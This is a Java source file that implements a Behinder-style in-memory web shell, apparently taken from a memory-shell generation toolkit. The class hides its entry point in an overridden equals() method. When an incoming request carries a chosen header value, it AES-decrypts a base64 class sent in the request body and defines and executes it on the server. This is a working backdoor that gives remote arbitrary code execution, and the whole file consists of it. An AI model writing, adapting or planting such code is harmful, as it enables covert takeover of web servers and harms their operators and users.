package com.reajason.javaweb.memshell.shelltool.behinder;

import java.io.BufferedReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.Key;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class Behinder extends ClassLoader {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public Behinder() {
    }

    public Behinder(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object request = unwrap(args[0], "request");
        Object response = unwrap(args[1], "response");

        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                Object session = request.getClass().getMethod("getSession").invoke(request);
                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                Map<String, Object> map = new HashMap<String, Object>(3);
                map.put("request", request);
                map.put("response", response);
                map.put("session", session);
                String parameter = ((BufferedReader) request.getClass().getMethod("getReader").invoke(request)).readLine();
                byte[] bytes = x(base64Decode(parameter));
                Object instance = new Behinder(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(map);
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public byte[] x(byte[] s) throws Exception {
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        Class<?> cipherClass = contextClassLoader.loadClass("javax.crypto.Cipher");
        Class<?> secretKeySpecClass = contextClassLoader.loadClass("javax.crypto.spec.SecretKeySpec");
        Constructor<?> constructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
        Method initMethod = cipherClass.getMethod("init", int.class, Key.class);
        Object c = cipherClass.getMethod("getInstance", String.class).invoke(null, "AES");
        initMethod.invoke(c, 2, constructor.newInstance(pass.getBytes(), "AES"));
        Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
        return ((byte[]) doFinalMethod.invoke(c, s));
    }

    @SuppressWarnings("all")
    public Object unwrap(Object obj, String fieldName) {
        try {
            return getFieldValue(obj, fieldName);
        } catch (Throwable e) {
            return obj;
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException();
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        try {
            Object decoder = Class.forName("java.util.Base64", false, loader).getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder", false, loader).newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
}
